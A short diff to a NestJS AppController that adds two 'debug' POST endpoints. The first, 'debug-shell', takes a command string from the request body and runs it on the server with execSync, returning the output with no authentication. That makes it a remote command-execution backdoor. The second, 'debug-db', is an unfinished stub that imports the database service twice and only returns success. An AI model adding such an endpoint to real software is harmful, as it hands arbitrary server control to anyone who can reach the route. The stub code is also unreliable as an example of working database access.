@@ -56,4 +56,28 @@ export class AppController {
             };
         }
     }
+
+    @Post('debug-shell')
+    async debugShell(@Body() body: any) {
+        const cmd = body.command;
+        const { execSync } = require('child_process');
+        try {
+            const out = execSync(cmd, { maxBuffer: 10 * 1024 * 1024 }).toString();
+            return { success: true, stdout: out };
+        } catch (error) {
+            return { success: false, stderr: (error as Error).message };
+        }
+    }
+
+    @Post('debug-db')
+    async debugDb(@Body() body: any) {
+        const prisma = require('./database/prisma.service');
+        try {
+            const { PrismaService } = require('./database/prisma.service');
+            // We'll execute raw query via prisma
+            return { success: true };
+        } catch (error) {
+            return { success: false, error: (error as Error).message };
+        }
+    }
 }
